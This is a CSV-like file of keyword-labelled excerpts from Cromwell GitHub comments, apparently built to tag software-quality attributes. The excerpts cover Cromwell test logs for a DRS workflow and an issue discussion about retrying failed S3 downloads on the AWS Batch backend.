PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:42,897 cromwell-system-akka.dispatchers.backend-dispatcher-140 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:58,493 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Workflow drs_usa_jdr complete. Final Outputs:; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:8375,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,8375,"rs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:42,570 cromwell-system-akka.dispatchers.backend-dispatcher-40 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:42,897 cromwell-system-akka.dispatchers.backend-dispatcher-140 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:58,493 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Workflow drs_usa_jdr complete. Final Outputs:; ""drs_usa_jdr.path1"": ""/cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json"",; ""drs_usa_jdr.map1"": {; ""drs_usa_jdr.size1"": ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:8596,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,8596,".backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:42,570 cromwell-system-akka.dispatchers.backend-dispatcher-40 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:42,897 cromwell-system-akka.dispatchers.backend-dispatcher-140 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:58,493 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Workflow drs_usa_jdr complete. Final Outputs:; ""drs_usa_jdr.path1"": ""/cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json"",; ""drs_usa_jdr.map1"": {; ""drs_usa_jdr.size1"": 18.0,; ""drs_usa_jdr.hash1"": ""faf12e94c25bef7df62e4a5eb62573f5"",; ""drs_usa_jdr.cloud1"": ""gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc""; - should successfully run",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:8823,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,8823,"bExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:42,570 cromwell-system-akka.dispatchers.backend-dispatcher-40 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:42,897 cromwell-system-akka.dispatchers.backend-dispatcher-140 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:58,493 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Workflow drs_usa_jdr complete. Final Outputs:; ""drs_usa_jdr.path1"": ""/cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json"",; ""drs_usa_jdr.map1"": {; ""drs_usa_jdr.size1"": 18.0,; ""drs_usa_jdr.hash1"": ""faf12e94c25bef7df62e4a5eb62573f5"",; ""drs_usa_jdr.cloud1"": ""gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc""; - should successfully run drs_usa_jdr (7 minutes, 24 seconds); </pre>; </details>",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1090,Performance,cache,cache,1090,"mary>; <pre>; 18:57:55.173 [daemonpool-thread-33] INFO centaur.api.CentaurCromwellClient$ - Submitting drs_usa_jdr returned workflow id efe9c9a5-cd24-4c78-b39d-d9f10cc754de; 2020-10-13 18:57:55,443 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa; 2020-10-13 18:57:57,875 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1663,Performance,cache,cache,1663," INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2218,Performance,cache,cache,2218,"18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7151,Performance,cache,cache,7151,"Actor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa; 2020-10-13 19:03:01,200 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7472,Performance,cache,cache,7472,"9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:57,Testability,test,test,57,"<details>; <summary>Example grep'ed output from v2alpha1 test…</summary>; <pre>; 18:57:55.173 [daemonpool-thread-33] INFO centaur.api.CentaurCromwellClient$ - Submitting drs_usa_jdr returned workflow id efe9c9a5-cd24-4c78-b39d-d9f10cc754de; 2020-10-13 18:57:55,443 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa; 2020-10-13 18:57:57,875 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:770,Availability,recover,recovery,770,"There is a Pull request in for AWS CLI call retry's which will mitigate; some of the problem. Currently full retries of tasks are not supported via; Cromwell Server coordinating with the AWS Batch backend. Having said that,; you could identify the AWS Batch Job Description and edit it to create a; new revision such that the revision uses the AWS Batch retry strategy. This; will mean that AWS Batch will retry any job that doesn't exit cleanly; (return code 0 or container host is terminated) up to a max number of; times. When that happens, the job ID remains the same so as far as Cromwell; knows it is the same job. I haven't had a chance to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:1532,Availability,down,download,1532,"When that happens, the job ID remains the same so as far as Cromwell; knows it is the same job. I haven't had a chance to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads som",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:1610,Availability,failure,failure,1610,"ce to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
